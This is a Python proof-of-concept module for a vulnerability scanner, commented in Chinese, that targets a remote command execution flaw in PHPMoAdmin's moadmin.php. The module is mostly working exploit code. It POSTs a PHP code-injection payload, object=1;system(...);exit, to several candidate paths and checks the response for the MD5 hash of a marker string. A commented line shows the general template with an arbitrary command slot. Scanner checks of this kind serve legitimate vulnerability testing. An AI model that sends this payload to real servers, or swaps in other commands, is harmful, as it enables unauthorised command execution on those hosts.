# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'PHPMoAdmin_0001'  # 平台漏洞编号，留空
    name = 'PHPMoAdmin /moadmin.php 远程命令执行漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2015-03-03'  # 漏洞公布时间
    desc = '''
        phpMoAdmin是一款便捷的在线MongoDB管理工具，可用于创建、删除和修改数据库和索引，提供视图和数据搜索工具，提供数据库启动时间和内存的统计，支持JSON格式数据的导入导出的php应用。
        moadmin.php文件设计缺陷导致远程命令执行漏洞的产生。
    '''  # 漏洞描述
    ref = 'http://seclists.org/fulldisclosure/2015/Mar/19'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPMoAdmin'  # 漏洞应用名称
    product_version = '*'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'caa53d73-c619-40ea-ad55-4900d63842e4'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            file_path = ['/moadmin.php', '/moadmin/moadmin.php',
                         '/wu-moadmin/wu-moadmin.php']
            for f in file_path:
                verify_url = self.target + f
                command = {
                    'object': '''1;system('echo -n "beebeeto"|md5sum;');exit''', }

                content = requests.post(verify_url, data=command).text
                if '595bb9ce8726b4b55f538d3ca0ddfd76' in content:
                    #args['success'] = True
                    #args['poc_ret']['vul_url'] = verify_url
                    #args['poc_ret']['post_content'] = "object=1;system('command');exit"
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))
                    return None
                continue
            return None

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
